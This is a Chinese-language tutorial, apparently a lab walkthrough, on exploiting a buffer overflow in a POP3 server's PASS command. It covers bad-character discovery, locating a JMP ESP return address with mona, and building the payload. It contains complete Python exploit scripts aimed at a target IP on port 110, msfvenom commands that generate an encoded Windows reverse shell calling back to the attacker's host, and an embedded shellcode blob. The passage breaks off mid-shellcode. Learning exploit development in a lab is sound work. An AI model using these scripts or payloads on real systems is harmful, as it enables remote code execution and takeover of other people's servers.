title="检查坏字符"></a>检查坏字符</h2><p>将2700字节的buffer字符串修改为共3500字节，成功覆盖，说明430字节的空余空间足够shellcode使用。</p><p>buffer中，有些字符被认为是“坏”的，不允许使用。一个通用坏字符案例是0x00，这个字符在copy命令执行时，当遇到第一个0x00，会终止字符串。</p><p>0x0D同样是一个坏字符，它意味着密码已经输入完成了。</p><p>一个经验丰富的exp作者，知道检查所有坏字符，以避免未来可能出现的问题。</p><p>最简单的方法是发送所有可能的字符，从0x00到0xff作为buffer的一部分，然后查看这些字符串是如何被应用程序所处理的。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/1.PNG" alt="1"></p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">#!/usr/bin/python<br>import socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>badchars = (<br>&quot;<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>0a<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>10&quot;<br>&quot;<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>14<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>19<span class="hljs-symbol">\x</span>1a<span class="hljs-symbol">\x</span>1b<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>1d<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>20&quot;<br>&quot;<span class="hljs-symbol">\x</span>21<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>25<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>27<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>2a<span class="hljs-symbol">\x</span>2b<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>2d<span class="hljs-symbol">\x</span>2e<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>30&quot;<br>&quot;<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>32<span class="hljs-symbol">\x</span>33<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>35<span class="hljs-symbol">\x</span>36<span class="hljs-symbol">\x</span>37<span class="hljs-symbol">\x</span>38<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>3a<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>3d<span class="hljs-symbol">\x</span>3e<span class="hljs-symbol">\x</span>3f<span class="hljs-symbol">\x</span>40&quot;<br>&quot;<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>43<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>4b<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>4e<span class="hljs-symbol">\x</span>4f<span class="hljs-symbol">\x</span>50&quot;<br>&quot;<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>55<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>5b<span class="hljs-symbol">\x</span>5c<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>5f<span class="hljs-symbol">\x</span>60&quot;<br>&quot;<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>6b<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>6d<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>70&quot;<br>&quot;<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>7a<span class="hljs-symbol">\x</span>7b<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>7d<span class="hljs-symbol">\x</span>7e<span class="hljs-symbol">\x</span>7f<span class="hljs-symbol">\x</span>80&quot;<br>&quot;<span class="hljs-symbol">\x</span>81<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>8e<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>90&quot;<br>&quot;<span class="hljs-symbol">\x</span>91<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>94<span class="hljs-symbol">\x</span>95<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>98<span class="hljs-symbol">\x</span>99<span class="hljs-symbol">\x</span>9a<span class="hljs-symbol">\x</span>9b<span class="hljs-symbol">\x</span>9c<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>9f<span class="hljs-symbol">\x</span>a0&quot;<br>&quot;<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>a4<span class="hljs-symbol">\x</span>a5<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>a7<span class="hljs-symbol">\x</span>a8<span class="hljs-symbol">\x</span>a9<span class="hljs-symbol">\x</span>aa<span class="hljs-symbol">\x</span>ab<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>ad<span class="hljs-symbol">\x</span>ae<span class="hljs-symbol">\x</span>af<span class="hljs-symbol">\x</span>b0&quot;<br>&quot;<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>b2<span class="hljs-symbol">\x</span>b3<span class="hljs-symbol">\x</span>b4<span class="hljs-symbol">\x</span>b5<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>b7<span class="hljs-symbol">\x</span>b8<span class="hljs-symbol">\x</span>b9<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>bc<span class="hljs-symbol">\x</span>bd<span class="hljs-symbol">\x</span>be<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>c0&quot;<br>&quot;<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>c4<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>c6<span class="hljs-symbol">\x</span>c7<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>ca<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>cc<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>cf<span class="hljs-symbol">\x</span>d0&quot;<br>&quot;<span class="hljs-symbol">\x</span>d1<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>d3<span class="hljs-symbol">\x</span>d4<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>d6<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>dc<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>de<span class="hljs-symbol">\x</span>df<span class="hljs-symbol">\x</span>e0&quot;<br>&quot;<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>e6<span class="hljs-symbol">\x</span>e7<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>e9<span class="hljs-symbol">\x</span>ea<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>ec<span class="hljs-symbol">\x</span>ed<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>ef<span class="hljs-symbol">\x</span>f0&quot;<br>&quot;<span class="hljs-symbol">\x</span>f1<span class="hljs-symbol">\x</span>f2<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>f5<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>f8<span class="hljs-symbol">\x</span>f9<span class="hljs-symbol">\x</span>fa<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>fd<span class="hljs-symbol">\x</span>fe<span class="hljs-symbol">\x</span>ff&quot; )<br><br>buffer=&quot;A&quot;*2606 + &quot;B&quot;*4 + badchars<br>try:<br>print &quot;<span class="hljs-symbol">\n</span>Sending evil buffer...&quot;<br>s.connect((&#x27;192.168.1.103&#x27;,110)) #修改为目标IP地址<br>data = s.recv(1024)<br>s.send(&#x27;USER username&#x27; +&#x27;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;)<br>data = s.recv(1024)<br>s.send(&#x27;PASS &#x27; + buffer + &#x27;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;)<br>s.close()<br>print &quot;<span class="hljs-symbol">\n</span>Done!&quot;<br>except:<br>print &quot;Could not connect to POP3!&quot;<br></code></pre></div></td></tr></table></figure><p>在kali上运行以上代码，目标机上依然报错了，我们选中右上角的<strong>寄存器面板</strong>，选中ESP（ 栈指针寄存器）<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/3.PNG" alt="3"></p><p>右键-follow in dump，可以看到内存转储面板中，有一条内容为<code>01 02 03 ... 09</code>的内容。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/4.PNG" alt="4"></p><p>如果正常没有坏字符的话，后面应该是<code>0a 0b 0c 0d</code>，而09后面的内容是<code>29 20</code>，</p><p><code>&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</code></p><p>值得注意的是0a是坏字符，而不是09。</p><h2 id="坏字符0a"><a href="#坏字符0a" class="headerlink" title="坏字符0a"></a>坏字符0a</h2><p>在每个程序中，坏字符并不是一样的。要根据不同的程序来判断。在这个程序中，修改发送的字符，去掉<code>\x0a</code></p><p><code>&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10&quot;</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/5.PNG" alt="5"></p><p>在内存转储面板中，我们可以看到09之后，顺利往后执行为<code>0b 0c ...</code></p><p>但是发现<code>0d</code>又不见了，说明又发现了坏字符<code>\x0d</code></p><p>最终检查出了坏字符有<code>\x00\x0a\x0d</code></p><h2 id="找到返回地址"><a href="#找到返回地址" class="headerlink" title="找到返回地址"></a>找到返回地址</h2><p>JMP ESP 是汇编语言中<strong>跳转到栈指针寄存器</strong>的意思</p><p><code>!mona modules</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/6.PNG" alt="6"><br>找到没有DEP、ASLR等内存保护的程序<code>Openc32.dll</code>，图中4个false代表，该dll动态链接库不会在每次重启的时候改变地址，也没有内存保护，这暗示我们可以使用该dll中的<code>JMP ESP</code>命令，跳转到栈指针寄存器。</p><p>使用msf将汇编语言<code>JMP ESP</code>转换为二进制</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>nasm_shell.rb<br></code></pre></div></td></tr></table></figure><p>结果为<code>FFE4</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/9.PNG" alt="9"></p><p>下一步就是找出该DLL中的跳转ESP命令的地址。<br><code>!mona find -s &quot;\xff\xe4&quot; -m Openc32.dll</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/7.PNG" alt="7"></p><p>因为Openc32.dll没有找到pointer，所以换一个dll，和上述挑选条件一样，选择SLMFC.dll，这次找到了pointer。</p><p><code>!mona find -s &quot;\xff\xe4&quot; -m SLMFC.DLL</code></p><p>找到了一些包含JMP ESP的地址，我们选择一个不含坏字符的地址<code>0x5f4c0ea3</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/8.PNG" alt="8"></p><h2 id="修改exp"><a href="#修改exp" class="headerlink" title="修改exp"></a>修改exp</h2><p>由于x86体系结构存储地址，使用little endian格式，就是小端存储。低位字节存储在存储器位于最低地址，高位字节位于最高地址。</p><p>将内存地址改写，<code>0x5f4c0ea3</code>改写为<code>\xa3\x0e\x4c\x5f</code></p><p><code>string= &quot;A&quot;* 2606+ &quot;\xa3\x0e\x4c\x5f&quot; + &quot;C&quot;*(3500-2606-4)</code></p><p>返回地址的无效数据改为跳转到ESP的指令。</p><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p>参考资料：<a href="https://whale3070.github.io/tools/2019/03/01/x/">msfvenom-生成攻击载荷-命令速查</a></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -l payloads<br><br>msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=kali的IP <span class="hljs-attribute">LPORT</span>=443 -f c<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/11.PNG" alt="11"><br>这样直接生成出来的攻击载荷包含坏字符。所以要使用shikata_ga_nai模块进行编码，避免使用坏字符</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=kali的IP <span class="hljs-attribute">LPORT</span>=443 -f c –e<br>x86/shikata_ga_nai -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="运行exp"><a href="#运行exp" class="headerlink" title="运行exp"></a>运行exp</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">#!/usr/bin/python<br>import socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>#string=&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&#x27;<br>#string= &quot;A&quot;* 2606+ &quot;B&quot;*4 + &quot;C&quot;*(3500-2606-4)<br>shellcode = (&quot;<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>2b<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>b1&quot;<br>&quot;<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>95<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>55<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>d4&quot;<br>&quot;<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>81<span class="hljs-symbol">\x</span>b9<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>f9<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>0f&quot;<br>&quot;<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>c7<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>2d<span class="hljs-symbol">\x</span>6d<span class="hljs-symbol">\x</span>ad<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>ae<span class="hljs-symbol">\x</span>de<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>4a&quot;<br>&quot;<span class="hljs-symbol">\x</span>2d<span class="hljs-symbol">\x</span>1d<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>ad<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>5f<span class="hljs-symbol">\x</span>48&quot;<br>&quot;<span class="hljs-symbol">\x</span>ef<span class="hljs-symbol">\x</span>27<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>d1<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>cc<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>e5&quot;<br>&quot;<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>cf<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>98<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>3a<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>a4<span class="hljs-symbol">\x</span>a4<span class="hljs-symbol">\x</span>72&quot;<br>&quot;<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>0b<span 